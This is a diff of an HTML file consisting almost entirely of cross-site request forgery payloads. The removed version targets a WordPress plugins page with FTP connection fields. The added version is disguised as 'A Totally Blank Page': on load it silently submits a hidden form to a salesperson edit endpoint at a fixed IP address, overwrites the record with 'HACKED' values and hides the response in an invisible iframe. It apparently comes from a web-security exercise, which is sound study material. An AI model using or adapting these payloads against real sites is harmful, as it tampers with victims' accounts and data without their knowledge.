@@ -1,12 +1,14 @@
-
-
 <html>
-   <body>
-      <form action="http://<target>/wp-admin/plugins.php" method="POST">
-         <input type="hidden" name="hostname" value="sumofpwn.nl" />
-         <input type="hidden" name="connection_type" value="ftp" />
-         <input type="hidden" name="password" value="password" />
-         <input type="submit" value="Submit request" />
-      </form>
-   </body>
-</html>
+  <head>
+    <title>A Totally Blank Page</title>
+  </head>
+  <body onload="document.CSRF.submit()">
+	<form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=5" method="post" style="display: none;" name='CSRF' target="res">
+	    <input type="text" name="first_name" value="HACKED" />
+      	<input type="text" name="last_name" value="WAS HACKED" />
+      	<input type="text" name="phone" value="111-111-2222" />
+      	<input type="text" name="email" value="HACKED@HACKED.com" />
+	</form>
+    <iframe name="res" style="display: none;"></iframe>
+  </body>
+</html> 
